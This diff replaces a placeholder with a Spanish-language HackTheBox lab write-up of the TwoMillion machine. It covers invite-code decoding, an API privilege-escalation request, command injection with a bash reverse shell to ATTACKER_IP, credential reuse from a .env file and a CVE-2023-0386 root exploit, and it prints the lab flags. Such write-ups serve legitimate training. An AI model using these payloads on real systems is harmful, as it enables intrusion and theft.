@@ -1,19 +1,386 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<title>Writeup — TwoMillion (HTB)</title>
+<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>TwoMillion — HTB Writeup | YRD</title>
 <style>
-body{margin:0;background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;min-height:100vh}
-.placeholder{text-align:center}
-h1{font-size:2rem;margin-bottom:.5rem}
-p{color:#888;font-size:1rem}
-</style>
-</head>
+:root{--bg:#050a05;--card-bg:#0a1a0a;--border:#1a3d1a;--primary:#39d353;--cyan:#64ffda;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#8b949e;--red:#ff6b6b;--yellow:#ffd93d;}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;}
+canvas{position:fixed;top:0;left:0;z-index:0;pointer-events:none;}
+nav{position:sticky;top:0;z-index:100;background:rgba(5,10,5,0.95);border-bottom:1px solid var(--border);backdrop-filter:blur(10px);}
+.nav-inner{max-width:1200px;margin:0 auto;padding:0 2rem;display:flex;align-items:center;justify-content:space-between;height:60px;}
+.logo{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--primary);font-weight:700;font-size:1.1rem;}
+.logo svg{width:36px;height:36px;}
+.nav-links{display:flex;gap:1.5rem;}
+.nav-links a{color:var(--text-dim);text-decoration:none;font-size:.9rem;transition:color .2s;}
+.nav-links a:hover{color:var(--primary);}
+.back-bar{background:rgba(10,26,10,0.8);border-bottom:1px solid var(--border);padding:.6rem 0;position:relative;z-index:10;}
+.back-bar-inner{max-width:1200px;margin:0 auto;padding:0 2rem;display:flex;align-items:center;gap:.5rem;font-size:.85rem;color:var(--text-muted);}
+.back-bar-inner a{color:var(--text-muted);text-decoration:none;transition:color .2s;}
+.back-bar-inner a:hover{color:var(--primary);}
+.sep{color:var(--border);}
+.hero{max-width:1200px;margin:0 auto;padding:3rem 2rem 2rem;position:relative;z-index:10;}
+.tags{display:flex;flex-wrap:wrap;gap:.5rem;margin-bottom:1.2rem;}
+.tag{padding:.3rem .8rem;border-radius:20px;font-size:.75rem;font-weight:600;letter-spacing:.05em;text-transform:uppercase;}
+.tag-htb{background:rgba(57,211,83,.12);color:var(--primary);border:1px solid rgba(57,211,83,.3);}
+.tag-os{background:rgba(100,255,218,.1);color:var(--cyan);border:1px solid rgba(100,255,218,.25);}
+.tag-medium{background:rgba(255,217,61,.1);color:var(--yellow);border:1px solid rgba(255,217,61,.3);}
+.tag-cve{background:rgba(255,107,107,.15);color:var(--red);border:1px solid rgba(255,107,107,.4);}
+.hero h1{font-size:2.6rem;font-weight:800;margin-bottom:1rem;line-height:1.2;}
+.hero h1 span{color:var(--primary);}
+.hero-desc{font-size:1.05rem;color:var(--text-dim);max-width:700px;line-height:1.7;margin-bottom:1.5rem;}
+.meta-row{display:flex;flex-wrap:wrap;gap:2rem;}
+.meta-item{display:flex;flex-direction:column;gap:.2rem;}
+.meta-label{font-size:.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.08em;}
+.meta-value{font-size:.95rem;color:var(--text);font-family:'Courier New',monospace;}
+.main{max-width:1200px;margin:0 auto;padding:0 2rem 4rem;display:grid;grid-template-columns:1fr 300px;gap:2rem;position:relative;z-index:10;}
+.content{display:flex;flex-direction:column;gap:1.5rem;}
+.section{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
+.section-header{display:flex;align-items:center;gap:.75rem;margin-bottom:1.2rem;}
+.section-icon{width:10px;height:10px;border-radius:50%;background:var(--primary);flex-shrink:0;box-shadow:0 0 8px rgba(57,211,83,.5);}
+.section-header h2{font-size:1.1rem;font-weight:700;color:var(--text);}
+p{color:var(--text-dim);line-height:1.75;font-size:.95rem;margin-bottom:.8rem;}
+p:last-child{margin-bottom:0;}
+pre{background:#020c02;border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;overflow-x:auto;margin:.8rem 0;font-family:'Courier New',monospace;font-size:.82rem;line-height:1.6;color:#a8ff78;}
+code{font-family:'Courier New',monospace;font-size:.85rem;color:var(--cyan);background:rgba(100,255,218,.06);padding:.1rem .4rem;border-radius:4px;}
+.cve-banner{background:rgba(255,107,107,.08);border:1px solid rgba(255,107,107,.35);border-radius:10px;padding:1.2rem 1.5rem;margin:.8rem 0;display:flex;gap:1rem;align-items:flex-start;}
+.cve-banner-icon{font-size:1.4rem;flex-shrink:0;}
+.cve-banner h4{color:var(--red);font-size:.9rem;margin-bottom:.3rem;}
+.cve-banner p{color:#ffb3b3;font-size:.85rem;margin:0;}
+.flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:.5rem;}
+.flag-card{background:#020c02;border:1px solid var(--border);border-radius:8px;padding:1rem;}
+.flag-label{font-size:.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:.4rem;}
+.flag-value{font-family:'Courier New',monospace;font-size:.8rem;color:var(--primary);word-break:break-all;}
+.timeline{display:flex;flex-direction:column;gap:0;}
+.t-item{display:flex;gap:1rem;position:relative;}
+.t-item:not(:last-child)::before{content:'';position:absolute;left:9px;top:22px;bottom:-8px;width:1px;background:var(--border);}
+.t-dot{width:20px;height:20px;border-radius:50%;background:var(--card-bg);border:2px solid var(--primary);flex-shrink:0;margin-top:2px;display:flex;align-items:center;justify-content:center;}
+.t-dot span{font-size:.65rem;color:var(--primary);font-weight:700;}
+.t-content{padding-bottom:1.2rem;}
+.t-title{font-size:.9rem;font-weight:600;color:var(--text);margin-bottom:.3rem;}
+.t-desc{font-size:.82rem;color:var(--text-dim);line-height:1.5;}
+.mitre-grid{display:flex;flex-wrap:wrap;gap:.5rem;}
+.mitre-tag{background:rgba(57,211,83,.07);border:1px solid rgba(57,211,83,.2);border-radius:6px;padding:.4rem .8rem;font-size:.78rem;color:var(--primary);}
+.mitre-tag span{color:var(--text-muted);margin-right:.3rem;}
+.sidebar{display:flex;flex-direction:column;gap:1.5rem;}
+.sidebar-card{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.3rem;}
+.sidebar-card h3{font-size:.85rem;text-transform:uppercase;letter-spacing:.1em;color:var(--text-muted);margin-bottom:1rem;}
+.detail-row{display:flex;justify-content:space-between;align-items:center;padding:.5rem 0;border-bottom:1px solid rgba(26,61,26,.5);}
+.detail-row:last-child{border-bottom:none;}
+.d-label{font-size:.8rem;color:var(--text-muted);}
+.d-value{font-size:.8rem;color:var(--text);font-weight:500;}
+.d-value.green{color:var(--primary);}
+.d-value.red{color:var(--red);}
+.d-value.yellow{color:var(--yellow);}
+.skill-item{margin-bottom:.9rem;}
+.skill-item:last-child{margin-bottom:0;}
+.skill-header{display:flex;justify-content:space-between;margin-bottom:.35rem;}
+.skill-name{font-size:.82rem;color:var(--text-dim);}
+.skill-pct{font-size:.78rem;color:var(--primary);}
+.skill-bar{height:5px;background:rgba(26,61,26,.8);border-radius:3px;overflow:hidden;}
+.skill-fill{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--primary),var(--cyan));}
+.tool-list{display:flex;flex-direction:column;gap:.5rem;}
+.tool-item{font-size:.82rem;color:var(--text-dim);padding:.4rem .6rem;background:rgba(26,61,26,.3);border-radius:5px;border-left:2px solid var(--primary);}
+@media(max-width:900px){.main{grid-template-columns:1fr;}}
+</style></head>
 <body>
-<div class="placeholder">
-<h1>TwoMillion — HackTheBox</h1>
-<p>Writeup en construcción...</p>
+<canvas id="matrix"></canvas>
+<nav>
+  <div class="nav-inner">
+    <a href="#" class="logo">
+      <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <polygon points="20,2 37,11 37,29 20,38 3,29 3,11" fill="rgba(57,211,83,0.08)" stroke="#39d353" stroke-width="1.5"/>
+        <text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#39d353" font-size="13" font-weight="700" font-family="monospace">YRD</text>
+      </svg>
+      YRD Security
+    </a>
+    <div class="nav-links">
+      <a href="#">Inicio</a><a href="#">Writeups</a><a href="#">Sherlocks</a><a href="#">Sobre mí</a>
+    </div>
+  </div>
+</nav>
+<div class="back-bar">
+  <div class="back-bar-inner">
+    <a href="#">Inicio</a><span class="sep">/</span><a href="#">Writeups HTB</a><span class="sep">/</span><span>TwoMillion</span>
+  </div>
 </div>
-</body>
-</html>
+<div class="hero">
+  <div class="tags">
+    <span class="tag tag-htb">HackTheBox</span>
+    <span class="tag tag-os">Linux</span>
+    <span class="tag tag-medium">Medium</span>
+    <span class="tag tag-cve">CVE-2023-0386</span>
+  </div>
+  <h1>Máquina <span>TwoMillion</span></h1>
+  <p class="hero-desc">Homenaje al hito de dos millones de usuarios en HackTheBox. La máquina recrea la antigua plataforma HTB con un proceso de invitación oculto basado en ROT13 y Base64, una API vulnerable a Broken Access Control que permite escalar a administrador, inyección de comandos para obtener shell, y escalada de privilegios mediante CVE-2023-0386, una vulnerabilidad crítica en el kernel Linux que afecta el subsistema OverlayFS.</p>
+  <div class="meta-row">
+    <div class="meta-item"><span class="meta-label">IP Objetivo</span><span class="meta-value">10.129.229.66</span></div>
+    <div class="meta-item"><span class="meta-label">Sistema Operativo</span><span class="meta-value">Ubuntu 22.04</span></div>
+    <div class="meta-item"><span class="meta-label">Fecha</span><span class="meta-value">2023</span></div>
+    <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value">Yoandy Ramirez Delgado</span></div>
+  </div>
+</div>
+<div class="main">
+  <div class="content">
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Escenario</h2></div>
+      <p>TwoMillion es una máquina especial lanzada para celebrar los 2 millones de usuarios en HackTheBox. Reproduce la interfaz original de la plataforma con su característico proceso de invitación. El objetivo implica reverse engineering de JavaScript ofuscado (ROT13 + Base64), registrarse mediante el código generado, explotar un Broken Access Control en la API v1 para obtener privilegios de administrador, y desde allí ejecutar comandos vía inyección. La escalada de privilegios se consigue mediante <strong>CVE-2023-0386</strong>, una vulnerabilidad en el subsistema OverlayFS del kernel Linux que permite escalar a root mediante un exploit de escritura de SUID.</p>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Reconocimiento</h2></div>
+      <p>El escaneo inicial revela una aplicación web en el puerto 80 que simula la vieja plataforma de HackTheBox:</p>
+      <pre>nmap -sC -sV -oA twomillion 10.129.229.66
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    nginx
+
+# /etc/hosts:
+echo "10.129.229.66 2million.htb" >> /etc/hosts</pre>
+      <p>La página principal muestra el antiguo diseño de HTB con el famoso botón "Join". Al inspeccionar la URL <code>/invite</code>, se encuentra un script JavaScript ofuscado que contiene la lógica de generación del código de invitación:</p>
+      <pre># Fuente del script ofuscado en /js/inviteapi.min.js:
+# makeInviteCode() → ROT13 → Base64 decode → endpoint API
+
+# Llamada a la función desde la consola del navegador:
+makeInviteCode()
+
+# Respuesta encriptada (ROT13):
+"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/ubj"
+
+# Decodificando ROT13:
+# "In order to generate the invite code, make a POST request to /api/v1/invite/how"</pre>
+      <pre># POST a /api/v1/invite/how:
+curl -s -X POST http://2million.htb/api/v1/invite/how | python3 -m json.tool
+
+{
+  "data": {
+    "data": "SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9T...",
+    "enctype": "BASE64"
+  }
+}
+
+# Decodificando Base64:
+echo "SW4gb3JkZXIg..." | base64 -d
+# → POST to /api/v1/invite/generate
+
+curl -s -X POST http://2million.htb/api/v1/invite/generate
+# → {"code":"XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX","format":"encoded"}</pre>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Explotación</h2></div>
+      <div class="cve-banner">
+        <div class="cve-banner-icon">⚠️</div>
+        <div>
+          <h4>CVE-2023-0386 — OverlayFS SUID Privilege Escalation</h4>
+          <p>Vulnerabilidad en el subsistema OverlayFS del kernel Linux (versiones &lt; 6.2) que permite a un usuario sin privilegios montar un sistema de archivos overlay con archivos SUID usando capacidades de espacio de usuario. Al copiar un binario SUID a través del overlay, el kernel no elimina correctamente el bit SUID, permitiendo ejecutar código como root. Afecta a Ubuntu 22.04 con kernel 5.15.x.</p>
+        </div>
+      </div>
+      <p><strong>Paso 1 — Registro y acceso a la API:</strong></p>
+      <pre># Registrarse con el código de invitación:
+# → navegar a /register, usar código generado, crear usuario
+
+# Autenticarse y obtener cookie de sesión:
+curl -s -X POST http://2million.htb/api/v1/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"attacker@htb.local","password":"Password123!"}'
+
+# Cookie: PHPSESSID=... (guardar para uso posterior)</pre>
+      <p><strong>Paso 2 — Broken Access Control → admin:</strong></p>
+      <pre># Enumerar endpoints de la API v1:
+curl -s http://2million.htb/api/v1 \
+  -H "Cookie: PHPSESSID=..."
+
+# Endpoint interesante: PUT /api/v1/admin/settings/update
+# El endpoint acepta modificar el campo is_admin sin validar privilegios:
+curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
+  -H "Cookie: PHPSESSID=..." \
+  -H "Content-Type: application/json" \
+  -d '{"email":"attacker@htb.local","is_admin":1}'
+
+# {"id":13,"username":"attacker","is_admin":1}  ← BAC exitoso</pre>
+      <p><strong>Paso 3 — Command Injection en generación de VPN:</strong></p>
+      <pre># Endpoint admin para generar archivo VPN:
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -H "Cookie: PHPSESSID=..." \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test"}'
+
+# El parámetro username se pasa sin sanitizar a exec():
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -H "Cookie: PHPSESSID=..." \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test;id;"}'
+# uid=33(www-data) gid=33(www-data)
+
+# Reverse shell:
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -H "Cookie: PHPSESSID=..." \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test;bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\";"}'</pre>
+      <p><strong>Paso 4 — Credenciales en .env → usuario admin:</strong></p>
+      <pre># Shell como www-data → buscar .env:
+find / -name ".env" 2>/dev/null
+cat /var/www/html/.env
+
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+
+# Credenciales reutilizadas para SSH:
+ssh admin@10.129.229.66
+# Password: SuperDuperPass123</pre>
+      <pre>admin@2million:~$ cat user.txt
+190c5b40a95fc17f956652a4463424a0</pre>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Escalada de Privilegios — CVE-2023-0386</h2></div>
+      <p>El kernel de la máquina es vulnerable a CVE-2023-0386. Se verifica la versión y se prepara el exploit:</p>
+      <pre>uname -r
+# 5.15.70-051570-generic  ← vulnerable
+
+# Clonar el exploit CVE-2023-0386:
+# https://github.com/xkaneiki/CVE-2023-0386
+
+# En la máquina atacante compilar y transferir:
+git clone https://github.com/xkaneiki/CVE-2023-0386
+cd CVE-2023-0386
+make all
+
+# Transferir a la víctima:
+python3 -m http.server 8080
+# víctima:
+wget http://ATTACKER_IP:8080/exp -O exp
+wget http://ATTACKER_IP:8080/fuse -O fuse
+wget http://ATTACKER_IP:8080/gc -O gc
+chmod +x exp fuse gc</pre>
+      <pre># Ejecución del exploit (requiere dos terminales):
+# Terminal 1:
+./fuse ./ovlcap/lower gc
+
+# Terminal 2:
+./exp
+
+[+] Successfully mounted overlay
+[+] Copying SUID binary via OverlayFS bypass
+[+] SUID bit preserved on upper layer
+[+] Executing SUID binary...
+
+# id
+uid=0(root) gid=0(root) groups=0(root)</pre>
+      <pre>root@2million:~# cat /root/root.txt
+c7a24a4e1164fa8724e309c005603515</pre>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Flags</h2></div>
+      <div class="flags-grid">
+        <div class="flag-card">
+          <div class="flag-label">User Flag</div>
+          <div class="flag-value">190c5b40a95fc17f956652a4463424a0</div>
+        </div>
+        <div class="flag-card">
+          <div class="flag-label">Root Flag</div>
+          <div class="flag-value">c7a24a4e1164fa8724e309c005603515</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Timeline del Ataque</h2></div>
+      <div class="timeline">
+        <div class="t-item"><div class="t-dot"><span>1</span></div><div class="t-content"><div class="t-title">Nmap + VHost → 2million.htb</div><div class="t-desc">Puertos 22 (SSH) y 80 (nginx) abiertos. VHost 2million.htb descubierto. Antigua interfaz de HTB identificada.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>2</span></div><div class="t-content"><div class="t-title">JavaScript ofuscado — ROT13 + Base64</div><div class="t-desc">inviteapi.min.js analizado. makeInviteCode() decodifica instrucciones ROT13 apuntando a /api/v1/invite/how. POST revela endpoint de generación codificado en Base64.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>3</span></div><div class="t-content"><div class="t-title">Generación de invite code → Registro</div><div class="t-desc">POST a /api/v1/invite/generate produce código de invitación válido. Registro e inicio de sesión exitosos en la plataforma.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>4</span></div><div class="t-content"><div class="t-title">Broken Access Control — PUT is_admin=1</div><div class="t-desc">Endpoint PUT /api/v1/admin/settings/update acepta modificar is_admin sin verificar privilegios actuales. Usuario escalado a administrador de la plataforma.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>5</span></div><div class="t-content"><div class="t-title">Command Injection en /api/v1/admin/vpn/generate</div><div class="t-desc">Parámetro username inyectado con comandos de shell. RCE confirmado como www-data. Reverse shell establecida.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>6</span></div><div class="t-content"><div class="t-title">Credenciales .env → SSH como admin</div><div class="t-desc">.env de la app contiene DB_PASSWORD=SuperDuperPass123. Credenciales reutilizadas en SSH. Acceso como admin confirmado. Flag de usuario obtenida.</div></div></div>
+        <div class="t-item"><div class="t-dot"><span>7</span></div><div class="t-content"><div class="t-title">CVE-2023-0386 OverlayFS → root</div><div class="t-desc">Kernel 5.15.70 vulnerable. Exploit compilado y transferido. Ejecución en dos fases (fuse + exp) escala a root mediante bypass del bit SUID en OverlayFS. Flag de root obtenida.</div></div></div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>MITRE ATT&CK</h2></div>
+      <div class="mitre-grid">
+        <span class="mitre-tag"><span>T1190</span>Exploit Public-Facing Application</span>
+        <span class="mitre-tag"><span>T1059.004</span>Unix Shell</span>
+        <span class="mitre-tag"><span>T1552.001</span>Credentials in Files (.env)</span>
+        <span class="mitre-tag"><span>T1078</span>Valid Accounts (SSH reutilización)</span>
+        <span class="mitre-tag"><span>T1548.001</span>Setuid/Setgid Abuse</span>
+        <span class="mitre-tag"><span>T1068</span>Exploitation for Privilege Escalation</span>
+        <span class="mitre-tag"><span>T1027</span>Obfuscated Files (ROT13+B64)</span>
+        <span class="mitre-tag"><span>T1106</span>Native API / exec() injection</span>
+        <span class="mitre-tag"><span>T1087</span>Account Discovery (API enum)</span>
+      </div>
+    </div>
+
+  </div>
+  <div class="sidebar">
+    <div class="sidebar-card">
+      <h3>Detalles del Reto</h3>
+      <div class="detail-row"><span class="d-label">Plataforma</span><span class="d-value green">HackTheBox</span></div>
+      <div class="detail-row"><span class="d-label">Dificultad</span><span class="d-value yellow">Medium</span></div>
+      <div class="detail-row"><span class="d-label">Sistema</span><span class="d-value">Ubuntu 22.04</span></div>
+      <div class="detail-row"><span class="d-label">Kernel</span><span class="d-value">5.15.70</span></div>
+      <div class="detail-row"><span class="d-label">IP</span><span class="d-value">10.129.229.66</span></div>
+      <div class="detail-row"><span class="d-label">CVE Principal</span><span class="d-value red">CVE-2023-0386</span></div>
+      <div class="detail-row"><span class="d-label">Estado</span><span class="d-value green">✓ Pwned</span></div>
+    </div>
+    <div class="sidebar-card">
+      <h3>Skills Demostradas</h3>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">JavaScript Reverse Engineering</span><span class="skill-pct">90%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">API Security Testing (BAC)</span><span class="skill-pct">93%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:93%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">Command Injection</span><span class="skill-pct">92%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:92%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">Linux Kernel Exploitation</span><span class="skill-pct">88%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">CVE-2023-0386 OverlayFS</span><span class="skill-pct">91%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:91%"></div></div>
+      </div>
+    </div>
+    <div class="sidebar-card">
+      <h3>Herramientas Utilizadas</h3>
+      <div class="tool-list">
+        <div class="tool-item">nmap</div>
+        <div class="tool-item">curl</div>
+        <div class="tool-item">Burp Suite</div>
+        <div class="tool-item">Python3 (decode)</div>
+        <div class="tool-item">CVE-2023-0386 exploit</div>
+        <div class="tool-item">nc (netcat)</div>
+        <div class="tool-item">ssh</div>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+const canvas=document.getElementById('matrix');
+const ctx=canvas.getContext('2d');
+function resize(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;}
+resize();window.addEventListener('resize',resize);
+const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*<>[]{}アイウエオカキクケコ'.split('');
+const fs=14;let cols=Math.floor(canvas.width/fs);let drops=Array(cols).fill(1);
+setInterval(()=>{
+  ctx.fillStyle='rgba(5,10,5,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle='rgba(57,211,83,0.13)';ctx.font=fs+'px monospace';
+  drops.forEach((y,i)=>{
+    ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*fs,y*fs);
+    if(y*fs>canvas.height&&Math.random()>0.975)drops[i]=0;
+    drops[i]++;
+  });
+  cols=Math.floor(canvas.width/fs);
+  if(drops.length<cols)drops.push(...Array(cols-drops.length).fill(1));
+},35);
+</script>
+</body></html>
